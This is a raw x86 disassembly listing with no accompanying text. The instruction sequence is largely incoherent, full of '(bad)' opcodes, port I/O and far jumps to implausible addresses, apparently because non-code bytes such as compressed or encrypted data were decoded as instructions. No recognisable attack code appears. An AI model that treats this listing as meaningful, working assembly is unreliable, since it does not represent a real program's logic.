  4078cb:	sub    edx,DWORD PTR [ecx+0x38]
  4078ce:	(bad)  
  4078cf:	cwde   
  4078d0:	pusha  
  4078d1:	pop    ebp
  4078d2:	xchg   ebp,eax
  4078d3:	push   esi
  4078d4:	test   eax,0x7694be0e
  4078d9:	rol    DWORD PTR [eax+eax*8-0x261ea7c3],1
  4078e0:	and    DWORD PTR [ebp-0x10b12853],0xe2da95b0
  4078ea:	add    eax,0xdce7b7f5
  4078ef:	loopne 0x4078f7
  4078f1:	lds    ecx,FWORD PTR [ecx+0x6a8e9b03]
  4078f7:	std    
  4078f8:	jg     0x407967
  4078fa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4078fb:	(bad)  
  4078fc:	cmp    ah,dl
  4078fe:	out    0x6c,al
  407900:	scas   eax,DWORD PTR es:[edi]
  407901:	dec    ebp
  407902:	daa    
  407903:	lea    esi,[edx-0x4fc735b8]
  407909:	retf   0xf8d9
  40790c:	pop    ecx
  40790d:	sti    
  40790e:	cmp    eax,0x5a3621fa
  407913:	std    
  407914:	test   eax,0xdd5e1cdf
  407919:	das    
  40791a:	inc    ebp
  40791b:	jmp    0x884978d2
  407920:	imul   esp,DWORD PTR [edx+ebp*2+0x6aa4622e],0xa0cf757f
  40792b:	loopne 0x4078d9
  40792d:	retf   
  40792e:	aaa    
  40792f:	mov    esp,0xb68ca4ce
  407934:	sahf   
  407935:	bound  esi,QWORD PTR [edx+ecx*1]
  407938:	sub    eax,0xc1fbcb22
  40793d:	jb     0x407957
  40793f:	jmp    0x4079ad
  407941:	mov    ch,0xa6
  407943:	and    DWORD PTR [eax],0x12
  407946:	fist   DWORD PTR ds:0x73d90b70
  40794c:	sbb    ecx,ebp
  40794e:	sbb    edi,ebp
  407950:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407951:	inc    ecx
  407952:	dec    eax
  407953:	inc    ebx
  407954:	xor    ah,BYTE PTR [ebp+eax*8-0x19]
  407958:	cmp    cl,0x13
  40795b:	xor    eax,0xc12dbfe
  407960:	pusha  
  407961:	pushf  
  407962:	push   eax
  407963:	xchg   ebx,eax
  407964:	sub    al,0x9b
  407966:	mov    ch,0xb7
  407968:	sahf   
  407969:	pop    edx
  40796a:	or     cl,BYTE PTR [eax+0x39fc41ca]
  407970:	jbe    0x407984
  407972:	mov    ebp,0xc0e7d838
  407977:	fucomip st,st(4)
  407979:	pop    DWORD PTR [ebp+0x7c]
  40797c:	data16 or ch,BYTE PTR [ebx-0x29]
  407980:	push   esp
  407981:	out    dx,al
  407982:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407983:	jmp    0xf5ec57f2
  407988:	jns    0x407944
  40798a:	dec    edx
  40798b:	add    eax,edx
  40798d:	test   al,0x6c
  40798f:	add    al,0xd6
  407991:	fwait
  407992:	imul   ecx,DWORD PTR [esi+0x57d16c0b],0x3a
  407999:	sub    BYTE PTR [edx-0x757c6ebd],dh
  40799f:	sbb    BYTE PTR [edx-0x8aff737],al
  4079a5:	or     al,0x28
  4079a7:	mov    eax,0x4478890
  4079ac:	pop    edx
  4079ad:	fmul   DWORD PTR [ebp+0x33b74199]
  4079b3:	jecxz  0x4079b8
  4079b5:	int3   
  4079b6:	(bad)  
  4079b7:	aam    0x67
  4079b9:	retf   
  4079ba:	mov    cl,0xc4
  4079bc:	aaa    
  4079bd:	(bad)  
  4079be:	retf   
  4079bf:	es out 0xab,al
  4079c2:	int3   
  4079c3:	mov    DWORD PTR [edx-0x7c],esp
  4079c6:	dec    ebp
  4079c7:	cmp    ebp,esp
  4079c9:	mov    dl,0x59
  4079cb:	outs   dx,DWORD PTR ds:[esi]
  4079cc:	rcl    WORD PTR [esi-0x2a80e413],cl
  4079d3:	mov    dh,0x5e
  4079d5:	adc    eax,0x1c8d88a3
  4079da:	or     dh,ah
  4079dc:	sbb    al,0x8e
  4079de:	pop    ecx
  4079df:	div    eax
  4079e1:	std    
  4079e2:	arpl   WORD PTR [esi+0x22],ax
  4079e5:	hlt    
  4079e6:	fild   WORD PTR [ebp-0x16]
  4079e9:	call   0x4a807e14
  4079ee:	aaa    
  4079ef:	stc    
  4079f0:	call   0xbd537411
  4079f5:	sbb    edi,esi
  4079f7:	push   ss
  4079f8:	repz mov esi,0xf1a9b715
  4079fe:	jmp    0x407a17
  407a00:	jb     0x4079ad
  407a02:	adc    al,0x6e
  407a04:	jne    0x4079fd
  407a06:	xor    ebx,0xe3083c7
  407a0c:	int    0xf4
  407a0e:	pushf  
  407a0f:	dec    edx
  407a10:	jg     0x4079fd
  407a12:	loop   0x4079ec
  407a14:	pop    ecx
  407a15:	scas   eax,DWORD PTR es:[edi]
  407a16:	add    DWORD PTR [ebx-0x2e],edx
  407a19:	and    DWORD PTR [edi+0x63],0xffffffd3
  407a1d:	jmp    0xa85724ce
  407a22:	ss jecxz 0x407a0d
  407a25:	xor    eax,DWORD PTR [ebp+0x5f62c4bf]
  407a2b:	add    DWORD PTR [eax],eax
  407a2d:	sahf   
  407a2e:	adc    ebp,DWORD PTR [ebp+ecx*1+0x70]
  407a32:	test   ch,cl
  407a34:	lods   eax,DWORD PTR ds:[esi]
  407a36:	iret   
  407a37:	loopne 0x407a34
  407a39:	dec    edi
  407a3a:	(bad)  
  407a3b:	sar    DWORD PTR [ebp-0x7cf12951],1
  407a41:	adc    DWORD PTR [edx],ebx
  407a43:	fcmove st,st(7)
  407a45:	dec    edx
  407a46:	or     ch,BYTE PTR [esi]
  407a48:	inc    ecx
  407a49:	push   esi
  407a4a:	mov    dl,BYTE PTR [eax]
  407a4c:	adc    al,0x5e
  407a4e:	loopne 0x407a42
  407a50:	enter  0x8856,0xdb
  407a54:	xchg   BYTE PTR [edx-0x14da15b6],ah
  407a5a:	test   DWORD PTR [edx+eax*4],eax
  407a5d:	daa    
  407a5e:	jp     0x407a15
  407a60:	adc    eax,0x847be234
  407a65:	jmp    0x3e7d8fc9
  407a6a:	sub    eax,0xa7e17f4e
  407a6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a70:	jg     0x407ad9
  407a72:	retf   
  407a73:	rcr    DWORD PTR [ebp+0x1706af2b],0xfb
  407a7a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a7b:	push   ss
  407a7c:	ins    BYTE PTR es:[edi],dx
  407a7d:	jp     0x407a96
  407a7f:	adc    al,0xde
  407a81:	aam    0xaa
  407a83:	adc    BYTE PTR [ecx+0x6d],al
  407a86:	ins    DWORD PTR es:[edi],dx
  407a87:	mov    esp,0xd11f3b60
  407a8c:	sbb    ebx,esp
  407a8e:	cmp    eax,0xcd6c8e5c
  407a93:	loop   0x407adc
  407a95:	sub    DWORD PTR [eax-0x462ce759],edx
  407a9b:	(bad)  
  407a9c:	adc    ah,BYTE PTR [ebx]
  407a9e:	sbb    ebp,DWORD PTR [esi-0x6213e67b]
  407aa4:	xor    BYTE PTR [ecx+0x5ae39d6],ch
  407aaa:	xor    esi,DWORD PTR [edx-0x7764df69]
  407ab0:	arpl   sp,ax
  407ab2:	ret    0x406f
  407ab5:	dec    ebp
  407ab6:	jns    0x407b2d
  407ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ab9:	mov    eax,0x3952ccc1
  407abe:	int3   
  407abf:	mov    edi,0xf14843a
  407ac4:	repz jp 0x407b2e
  407ac7:	fistp  DWORD PTR [ebp-0x47]
  407aca:	sbb    DWORD PTR ds:0x6b0ef92c,ecx
  407ad0:	push   ss
  407ad1:	ficom  DWORD PTR [edi]
  407ad3:	pop    esp
  407ad4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407ad5:	jp     0x407b1e
  407ad7:	shl    eax,cl
  407ad9:	xor    ecx,0x6ee2bf26
  407adf:	fcmovne st,st(5)
  407ae1:	loop   0x407b25
  407ae3:	outs   dx,DWORD PTR ds:[esi]
  407ae4:	xor    cl,BYTE PTR [ebx-0x29]
  407ae7:	pop    edi
  407ae8:	mov    esp,0x1918ae17
  407aed:	or     bl,cl
  407aef:	pop    es
  407af0:	dec    ebp
  407af1:	push   0xffffff9a
  407af3:	nop
  407af4:	dec    esp
  407af5:	call   0x8d200711
  407afa:	icebp  
  407afb:	jmp    0x407b4d
  407afd:	add    al,0x99
  407aff:	scas   eax,DWORD PTR es:[edi]
  407b00:	add    al,0xa5
  407b02:	test   eax,0x7e5ec153
  407b07:	mov    ebp,0x1199f02d
  407b0c:	sub    eax,0x12c81d6a
  407b11:	ins    DWORD PTR es:[edi],dx
  407b12:	ficom  DWORD PTR [edx+0x17]
  407b15:	fistp  DWORD PTR fs:[ecx-0x405fa41f]
  407b1c:	enter  0x6fc1,0x6e
  407b20:	push   ds
  407b21:	inc    ebx
  407b22:	test   al,0x22
  407b24:	jnp    0x407b82
  407b26:	in     eax,dx
  407b27:	inc    esi
  407b28:	mov    ds,WORD PTR [esi-0x58c23153]
  407b2e:	pop    ds
  407b2f:	js     0x407b7e
  407b31:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b32:	mov    ebx,DWORD PTR [ecx+ebx*8]
  407b35:	dec    esp
  407b36:	das    
  407b37:	mov    cl,0xff
  407b39:	xchg   ecx,eax
  407b3a:	ret    
  407b3b:	ss xor eax,0xfec1d329
  407b41:	rcl    DWORD PTR [eax],cl
  407b43:	adc    ebp,DWORD PTR [eax+0x36]
  407b46:	pop    ebp
  407b47:	mov    ds:0x11e04ae,eax
  407b4c:	sar    ah,1
  407b4e:	cli    
  407b4f:	cmp    ebx,DWORD PTR [edx-0x1ec2003d]
  407b55:	add    eax,esp
  407b57:	neg    dl
  407b59:	cld    
  407b5a:	test   eax,0xba08d9a2
  407b5f:	fwait
  407b60:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b61:	fdivr  DWORD PTR [edi-0x1d670e34]
  407b67:	nop
  407b68:	sub    BYTE PTR ds:0x6e819acb,ah
  407b6e:	adc    eax,esp
  407b70:	jno    0x407b58
  407b72:	mov    WORD PTR [edi-0x74abd2b5],?
  407b78:	jo     0x407bc8
  407b7a:	xchg   esp,eax
  407b7b:	pop    ds
  407b7c:	jb     0x407b6f
  407b7e:	popa   
  407b7f:	adc    dh,BYTE PTR [edx]
  407b81:	jge    0x407b8b
  407b83:	test   BYTE PTR [eax+0xd2211d0],bh
  407b89:	je     0x407b3f
  407b8b:	adc    al,0xf
  407b8d:	add    ecx,DWORD PTR [ecx+0x543c9550]
  407b93:	scas   al,BYTE PTR es:[edi]
  407b94:	mov    ch,0xf8
  407b96:	add    al,0xa1
  407b98:	jg     0x407b8a
  407b9a:	nop    esp
  407b9d:	aam    0x4e
  407b9f:	jg     0x407b9a
  407ba1:	popf   
  407ba2:	aad    0x9d
  407ba4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ba5:	out    dx,al
  407ba6:	xchg   ebx,eax
  407ba7:	hlt    
  407ba8:	ror    BYTE PTR [esi+0x4cb84a52],0x21
  407baf:	stc    
  407bb0:	stc    
  407bb1:	cdq    
  407bb2:	ds jne 0x407c08
  407bb5:	cwde   
  407bb6:	pop    ebp
  407bb7:	push   ebx
  407bb8:	inc    edx
  407bb9:	ins    BYTE PTR es:[edi],dx
  407bba:	jns    0x407b5c
  407bbc:	adc    eax,0xb574e71b
  407bc1:	ret    
  407bc2:	push   ds
  407bc3:	mov    dh,0x62
  407bc5:	iret   
  407bc6:	mov    ah,0x90
  407bc8:	xor    BYTE PTR [edi+0x23],0x22
  407bcc:	addr16 pop esp
  407bce:	pop    esi
  407bcf:	and    BYTE PTR [ecx],al
  407bd1:	pop    esi
  407bd2:	arpl   WORD PTR [ebp+0x2ed88b],di
  407bd8:	or     al,BYTE PTR [edx+0x6c]
  407bdb:	in     al,dx
  407bdc:	inc    esi
  407bdd:	pop    edx
  407bde:	stos   BYTE PTR es:[edi],al
  407bdf:	sub    cl,al
  407be1:	scas   eax,DWORD PTR es:[edi]
  407be2:	imul   edx,DWORD PTR [ebx+0x5],0x38
  407be6:	test   BYTE PTR [ecx+eiz*8+0x11],dh
  407bea:	fmul   DWORD PTR ds:0x67c6c95a
  407bf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407bf1:	(bad)  
  407bf2:	mov    edi,0xec57b539
  407bf7:	or     al,0xe
  407bf9:	sbb    dh,BYTE PTR [edi-0x3e]
  407bfc:	mov    bl,0x28
  407bfe:	int    0x3b
  407c00:	mov    ecx,0x821b7bbd
  407c05:	push   ebp
  407c06:	dec    ecx
  407c07:	gs pushf 
  407c09:	retf   
  407c0a:	retf   
  407c0b:	retf   
  407c0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c0d:	xchg   DWORD PTR [ebp+0x7daaa214],edx
  407c13:	push   ebx
  407c14:	jmp    0x1bd2:0xef947441
  407c1b:	(bad)  
  407c1d:	dec    esi
  407c1e:	mov    eax,0x11b03f2f
  407c23:	jbe    0x407bc9
  407c25:	sub    BYTE PTR [ecx],0x1f
  407c28:	xor    eax,0x7802aadd
  407c2d:	jo     0x407bb1
  407c2f:	lahf   
  407c30:	mov    edx,0x47d98fcf
  407c35:	sbb    ah,BYTE PTR ds:0xf6104cc3
  407c3b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407c3c:	and    eax,0x6432011
  407c41:	jge    0x407cb0
  407c43:	dec    esi
  407c44:	pop    eax
  407c45:	lods   eax,DWORD PTR ds:[esi]
  407c46:	arpl   bp,ax
  407c48:	js     0x407c0d
  407c4a:	fsub   DWORD PTR [ebx]
  407c4c:	aaa    
  407c4d:	test   ah,bl
  407c4f:	les    ebx,FWORD PTR [esp+ecx*1+0xd0fde3e]
  407c56:	fst    QWORD PTR [eax-0x291a5724]
  407c5c:	and    esi,DWORD PTR [edi+edx*1-0x24]
  407c60:	fiadd  WORD PTR [ecx-0x7f]
  407c63:	ror    DWORD PTR [ebp+0x78],1
  407c66:	loopne 0x407cd9
  407c68:	ret    0x9ebe
  407c6b:	cmp    al,0x17
  407c6d:	mov    dh,ah
  407c6f:	lods   eax,DWORD PTR ds:[esi]
  407c70:	pop    ecx
  407c71:	in     al,dx
  407c72:	sti    
  407c73:	in     eax,0x45
  407c75:	pusha  
  407c76:	sbb    al,cl
  407c78:	mov    ch,0xa8
  407c7a:	add    DWORD PTR [ecx],edi
  407c7c:	imul   ebx,DWORD PTR [ebx-0x6065360f],0x64
  407c83:	or     BYTE PTR [esi+0x24f62be9],dh
  407c89:	cmp    eax,DWORD PTR [ebp+0x1ff5647c]
  407c8f:	push   ebp
  407c90:	xor    eax,0xc5128918
  407c95:	sar    BYTE PTR [ecx],cl
  407c97:	adc    eax,0x4d154e2
  407c9c:	shl    DWORD PTR [edx+edx*4+0x7d53c5ed],0x65
  407ca4:	imul   edi,DWORD PTR [edx+0xf],0x44de5e05
  407cab:	and    eax,esp
  407cad:	pop    eax
  407cae:	jl     0x407d06
  407cb0:	and    bh,BYTE PTR [edi]
  407cb2:	adc    al,0xce
  407cb4:	cli    
  407cb5:	jecxz  0x407c38
  407cb7:	dec    ebx
  407cb8:	call   0xe00a:0xf71f63c8
  407cbf:	push   ebp
  407cc0:	scas   eax,DWORD PTR es:[edi]
  407cc1:	outs   dx,BYTE PTR ds:[esi]
  407cc2:	retw   0x370
  407cc6:	scas   eax,DWORD PTR es:[edi]
  407cc7:	mov    BYTE PTR [esi-0x5260d908],bl
  407ccd:	das    
  407cce:	jg     0x407d4a
  407cd0:	jnp    0x407ca8
  407cd2:	(bad)  
  407cd3:	(bad)  
  407cd4:	call   0x4977:0x39d7b7f1
  407cdb:	or     eax,0x6585b518
  407ce0:	mov    dh,0x7f
  407ce2:	in     eax,0x25
  407ce4:	fwait
  407ce5:	add    dl,bl
  407ce7:	fst    DWORD PTR [edx+edx*8-0x3cf27571]
  407cee:	fdiv   st(5),st
  407cf0:	pop    ds
  407cf1:	sub    al,0x79
  407cf3:	aad    0xe9
  407cf5:	dec    ebx
  407cf6:	jmp    0x1115edb3
  407cfb:	jl     0x407d79
  407cfd:	out    dx,al
  407cfe:	inc    ecx
  407cff:	out    dx,eax
  407d00:	sub    al,0xe9
  407d02:	(bad)  
  407d04:	cwde   
  407d05:	clc    
  407d06:	fbld   TBYTE PTR [ebp-0x4d]
  407d09:	neg    BYTE PTR [eax]
  407d0b:	fstp   DWORD PTR [eax+0x36f7e57c]
  407d11:	adc    DWORD PTR [esi+0x4d],eax
  407d14:	inc    ebp
  407d15:	mov    ch,0x2d
  407d17:	out    0xf8,eax
  407d19:	push   ebx
  407d1a:	inc    ebp
  407d1b:	mov    dl,0xe0
  407d1d:	add    DWORD PTR [ebp+0x688940c4],esi
  407d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d24:	mov    bh,0x27
  407d26:	xlat   BYTE PTR ds:[ebx]
  407d27:	mov    eax,0x877cd07a
  407d2c:	xchg   esi,eax
  407d2d:	dec    esp
  407d2e:	fisttp WORD PTR [edx]
  407d30:	adc    al,0xf6
  407d32:	xchg   esi,eax
  407d33:	add    eax,0x1a1f3c21
  407d38:	aad    0x2d
  407d3a:	in     al,0x39
  407d3c:	sbb    eax,0x1d338b5e
  407d41:	jns    0x407d42
  407d43:	inc    esp
  407d44:	(bad)  
  407d45:	push   ecx
  407d46:	fs out dx,al
  407d48:	mov    dx,ds
  407d4b:	or     DWORD PTR [ecx],edi
  407d4d:	push   ecx
  407d4e:	(bad)
  407d54:	sbb    DWORD PTR [edx],esp
  407d56:	xchg   esi,eax
  407d57:	adc    ebp,DWORD PTR [ecx]
  407d59:	inc    eax
  407d5a:	std    
  407d5b:	dec    esi
  407d5c:	push   eax
  407d5d:	into   
  407d5e:	cs ja  0x407cfa
  407d61:	jmp    0x407d58
  407d63:	push   edx
  407d64:	pusha  
  407d65:	sar    BYTE PTR [esp+edx*2],cl
  407d68:	sbb    al,0x26
  407d6a:	mov    al,0x6
  407d6c:	in     al,0x44
  407d6e:	mov    dh,0x91
  407d70:	cmp    eax,0xfc06844d
  407d75:	jo     0x407d85
  407d77:	add    dl,dl
  407d79:	and    eax,0xc4d8ab28
  407d7e:	cmp    eax,0x79373dab
  407d83:	outs   dx,BYTE PTR ds:[esi]
  407d84:	inc    edi
  407d85:	jp     0x407d91
  407d87:	pop    ds
  407d88:	xlat   BYTE PTR gs:[ebx]
  407d8a:	push   0x82d2f846
  407d8f:	cmp    al,0x87
  407d91:	add    BYTE PTR cs:[esi],bl
  407d94:	inc    ebp
  407d95:	retf   0x1296
  407d98:	push   cs
  407d99:	fwait
  407d9a:	mov    esp,0x187f7fc7
  407d9f:	pop    ebp
  407da0:	xchg   al,ah
  407da2:	rcr    BYTE PTR [eax-0x48ea095f],1
  407da8:	imul   edi,DWORD PTR [edx+esi*4+0x0],0x153fdb8b
  407db0:	cmp    BYTE PTR [edi+0x3f],ah
  407db3:	out    0x82,al
  407db5:	mov    WORD PTR [ebx],fs
  407db7:	adc    ah,dl
  407db9:	das    
  407dba:	inc    ecx
  407dbb:	dec    eax
  407dbc:	cwde   
  407dbd:	ins    BYTE PTR es:[edi],dx
  407dbe:	int    0xfb
  407dc0:	mov    WORD PTR [esi-0x73791537],es
  407dc6:	fist   DWORD PTR [esi]
  407dc8:	dec    ebp
  407dc9:	mov    bl,0x3
  407dcb:	mov    ah,BYTE PTR [ecx-0x1a]
  407dce:	fnstenv [eax]
  407dd0:	stc    
  407dd1:	cmp    BYTE PTR [ebx-0x5c9d9ac7],bl
  407dd7:	pop    esp
  407dd8:	sahf   
  407dd9:	jmp    0x2939d1b7
  407dde:	push   ds
  407ddf:	dec    esp
  407de0:	mov    ds:0x1227f09b,eax
  407de5:	xor    eax,0x93757a20
  407dea:	xor    bl,BYTE PTR [esp+esi*2+0x710134c6]
  407df1:	out    dx,eax
  407df2:	xchg   esp,eax
  407df3:	cmp    dl,BYTE PTR [edx+0x4eb3f323]
  407df9:	push   edi
  407dfa:	imul   edi,DWORD PTR [esp+eiz*8-0x52b12395],0x4
  407e02:	je     0x407e2f
  407e04:	cmp    ecx,esi
  407e06:	ins    BYTE PTR es:[edi],dx
  407e07:	xor    eax,0xe6958a39
  407e0c:	inc    esi
  407e0d:	pop    esi
  407e0e:	mov    BYTE PTR [ebp-0x5fd56845],ah
  407e14:	adc    ch,BYTE PTR [ebx+0x541576b1]
  407e1a:	das    
  407e1b:	je     0x407e78
  407e1d:	aam    0xec
  407e1f:	js     0x407de3
  407e21:	aad    0x5f
  407e23:	and    al,0x53
  407e25:	push   0x7fc19ce5
  407e2a:	leave  
  407e2b:	cmp    al,BYTE PTR [esi-0x5d]
  407e2e:	xchg   edx,eax
  407e30:	fsub   st,st(4)
  407e32:	call   0x4090b042
  407e37:	jbe    0x407deb
  407e39:	jp     0x407e4c
  407e3b:	inc    edx
  407e3c:	loope  0x407e8a
  407e3e:	je     0x407e25
  407e40:	and    BYTE PTR [ecx],ch
  407e42:	mov    esi,DWORD PTR [ebp+0x712c6b55]
  407e48:	xchg   ebx,eax
  407e49:	ror    DWORD PTR [ebp+0x23eaba5f],cl
  407e4f:	xchg   edx,eax
  407e50:	(bad)  
  407e51:	test   DWORD PTR [edi+0x2354e1eb],0x29747900
  407e5b:	adc    al,0x1b
  407e5d:	cmp    ebp,DWORD PTR [edi]
  407e5f:	dec    esp
  407e60:	mov    esp,0x20d90a31
  407e65:	ins    BYTE PTR es:[edi],dx
  407e66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e67:	sbb    al,0x39
  407e69:	pop    eax
  407e6a:	mov    ebp,DWORD PTR [ebp-0x4e]
  407e6d:	xor    BYTE PTR [esi],bh
  407e6f:	retf   
  407e70:	lds    ebx,FWORD PTR [ebx+eiz*8-0x47]
  407e74:	(bad)  
  407e75:	sbb    bl,BYTE PTR [eax-0x4fb3b87b]
  407e7b:	aad    0x14
  407e7d:	sbb    ecx,esp
  407e7f:	inc    ebp
  407e80:	mov    eax,0x80291c63
  407e85:	and    BYTE PTR [edi+0x40ec2244],bh
  407e8b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e8c:	int    0x64
  407e8e:	add    DWORD PTR [edx],edx
  407e90:	xor    eax,0x188ac938
  407e95:	js     0x407f13
  407e97:	jne    0x407ef8
  407e99:	pop    edx
  407e9a:	or     dl,al
  407e9c:	push   eax
  407e9d:	jno    0x407e99
  407e9f:	mov    al,0xf3
  407ea1:	push   edi
  407ea2:	(bad)  
  407ea3:	fcomp  QWORD PTR [esi+eax*8-0x34cb01c5]
  407eaa:	sbb    al,0xef
  407eac:	mov    es,WORD PTR [edx]
  407eae:	popa   
  407eaf:	in     eax,0x96
  407eb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407eb2:	test   eax,0x91455baa
  407eb7:	gs adc ch,dl
  407eba:	arpl   WORD PTR [ebx-0x2947f73],ax
  407ec0:	xchg   ecx,eax
  407ec1:	mov    ch,0x15
  407ec3:	sbb    esp,DWORD PTR [ebx+0x14784b3]
  407ec9:	mov    esi,0x9aa28480
  407ece:	xchg   ecx,eax
  407ecf:	out    0xc3,al
  407ed1:	xchg   esp,eax
  407ed2:	jae    0x407f05
  407ed4:	loop   0x407f12
  407ed6:	mov    ds:0x220f5d73,eax
  407edb:	cmp    esp,DWORD PTR [edx]
  407edd:	xor    cl,BYTE PTR ds:[bp+di-0x75]
  407ee2:	into   
  407ee3:	xchg   esp,eax
  407ee4:	in     al,dx
  407ee5:	xor    eax,DWORD PTR [eax+0x5e7ea64b]
  407eeb:	jnp    0x407efd
  407eed:	shl    DWORD PTR [esi-0x79],0x8f
  407ef1:	imul   ebp,DWORD PTR [edx+0x327b3ef5],0xffffffbb
  407ef8:	pop    ecx
  407ef9:	xchg   ebx,eax
  407efa:	call   FWORD PTR [esi+0x23aa50af]
  407f00:	dec    esi
  407f01:	and    BYTE PTR [eax-0x5634a0d2],dl
  407f07:	stos   DWORD PTR es:[edi],eax
  407f08:	lahf   
  407f09:	pusha  
  407f0a:	test   DWORD PTR [eax],eax
  407f0c:	cdq    
  407f0d:	add    al,0xdd
  407f0f:	arpl   WORD PTR [eax+0x11d034d9],di
  407f15:	push   DWORD PTR [ecx]
  407f17:	shl    DWORD PTR [ebx+0x6],1
  407f1a:	xlat   BYTE PTR ds:[ebx]
  407f1b:	mov    esi,ebx
  407f1d:	lds    edi,FWORD PTR [eax]
  407f1f:	sub    al,0x52
  407f21:	retf   0xb438
  407f24:	adc    al,BYTE PTR [ebx-0x4ac62c32]
  407f2a:	xor    esi,DWORD PTR [edx]
  407f2c:	mov    bl,0xbb
  407f2e:	or     ebx,0xea9cbd1a
  407f34:	adc    eax,0x1397e974
  407f39:	call   0x8691:0x208c2ad8
  407f40:	jmp    0xa4cdb1d0
  407f45:	jnp    0x407f75
  407f47:	sub    edx,DWORD PTR fs:[eax+0x79]
  407f4b:	mov    al,0xa
  407f4d:	lahf   
  407f4e:	leave  
  407f4f:	mov    BYTE PTR [edx-0x6591239c],ch
  407f55:	aaa    
  407f56:	push   esi
  407f57:	idiv   DWORD PTR [ebx+0x4c]
  407f5a:	inc    ecx
  407f5b:	inc    esi
  407f5c:	int    0x17
  407f5e:	retf   
  407f5f:	outs   dx,BYTE PTR ds:[esi]
  407f60:	scas   al,BYTE PTR es:[edi]
  407f61:	jno    0x407f98
  407f63:	or     BYTE PTR [edx+0x43],ch
  407f66:	outs   dx,DWORD PTR ds:[esi]
  407f67:	pop    ss
  407f68:	mov    ecx,DWORD PTR ds:0xa3acf664
  407f6e:	cs push 0xffffffeb
  407f71:	inc    ebp
  407f72:	out    0xaa,al
  407f74:	arpl   WORD PTR [ebx+0x4680b06c],dx
  407f7a:	jmp    0x407fcd
  407f7c:	cmp    DWORD PTR [eax+0x67f4ae4f],ebx
  407f82:	add    al,0x1f
  407f84:	and    al,0xa7
  407f86:	sub    DWORD PTR [edi],ebp
  407f88:	pop    es
  407f89:	mov    esp,0xcc349568
  407f8e:	(bad)  
  407f8f:	mov    edx,0x4f9be3f5
  407f94:	sahf   
  407f95:	nop
  407f96:	out    dx,al
  407f97:	dec    esp
  407f98:	mov    esi,0x4a7e64f5
  407f9d:	jl     0x407fef
  407f9f:	push   0xffffffbe
  407fa1:	shl    BYTE PTR [ecx-0x3b],cl
  407fa4:	and    ebp,DWORD PTR [edx]
  407fa6:	push   0xdedb6557
  407fab:	and    al,0xf7
  407fad:	mov    eax,ds:0x6cb3b5fe
  407fb2:	ins    DWORD PTR es:[edi],dx
  407fb3:	inc    ecx
  407fb4:	cmp    eax,DWORD PTR [ebx+0x76da3da6]
  407fba:	ds pop esp
  407fbc:	pushf  
  407fbd:	dec    esi
  407fbe:	jp     0x407ffa
  407fc0:	jae    0x407f97
  407fc2:	lods   al,BYTE PTR ds:[esi]
  407fc3:	in     al,dx
  407fc4:	imul   esp,edx,0xffffffcd
  407fc7:	adc    al,0xc5
  407fc9:	push   edi
  407fca:	fwait
  407fcb:	pop    esp
  407fcc:	pop    esi
  407fcd:	popa   
  407fce:	mov    gs,esp
  407fd0:	ins    DWORD PTR es:[edi],dx
  407fd1:	shr    ch,0x1b
  407fd4:	jmp    0x446f:0x40c47505
  407fdb:	aas    
  407fdc:	cld    
  407fdd:	and    dl,0x12
  407fe0:	int    0xa0
  407fe2:	or     esp,ecx
  407fe4:	pusha  
  407fe5:	shl    edi,cl
  407fe7:	cmp    esp,DWORD PTR [eax]
  407fe9:	into   
  407fea:	fistp  QWORD PTR [ecx]
  407fec:	scas   al,BYTE PTR es:[edi]
  407fed:	cmp    eax,0x506f65b4
  407ff2:	pop    esp
  407ff3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ff4:	xor    dh,BYTE PTR [esi-0x339959a3]
  407ffa:	jb     0x407fd8
  407ffc:	adc    esp,DWORD PTR [edi-0x10]
  407fff:	mov    ds:0x98f3b129,al
  408004:	fs add al,0x5e
  408007:	mov    ecx,0x60531e31
  40800c:	push   es
  40800d:	enter  0xe6c6,0x57
  408011:	or     eax,0x922a4ba4
  408016:	adc    ah,ah
  408018:	into   
  408019:	not    BYTE PTR [edi+0x1a1bc9e4]
  40801f:	out    dx,ax
  408021:	sbb    eax,0x37fc5c5f
  408026:	loop   0x407fd1
  408028:	lods   eax,DWORD PTR ds:[esi]
  408029:	or     eax,0xc8a95cd2
  40802e:	ins    DWORD PTR es:[edi],dx
  40802f:	xor    DWORD PTR [esi-0xe],ecx
  408032:	xchg   ebx,eax
  408033:	cmp    eax,0x5a4dcaf2
  408038:	adc    edi,DWORD PTR [esi+ecx*4-0x5eaa8611]
  40803f:	out    dx,eax
  408040:	dec    ebx
  408041:	cmp    BYTE PTR gs:[ecx],0xbf
  408045:	cdq    
  408046:	sbb    al,0xb6
  408048:	mov    dh,0xd3
  40804a:	pop    edi
  40804b:	ds ja  0x4080ac
  40804e:	addr16 dec esp
  408050:	inc    edi
  408051:	and    ch,ch
  408053:	ret    
  408054:	push   ebx
  408055:	fwait
  408056:	and    al,0x9a
  408058:	imul   ebx,DWORD PTR [ebx+0x30a7291c],0xffffffe4
  40805f:	rcl    BYTE PTR [esi],0x7b
  408062:	or     esi,DWORD PTR [ebx]
  408064:	sahf   
  408065:	data16 sahf 
  408067:	cld    
  408068:	jge    0x4080ba
  40806a:	dec    ebp
  40806b:	pusha  
  40806c:	dec    ebx
  40806d:	out    0xdf,al
  40806f:	jp     0x4080ac
  408071:	xor    ebp,DWORD PTR [edx-0x1588df15]
  408077:	mov    eax,ds:0x351ff800
  40807c:	mov    WORD PTR [ebx],es
  40807e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40807f:	shr    DWORD PTR [edx],0x47
  408082:	rcl    bh,cl
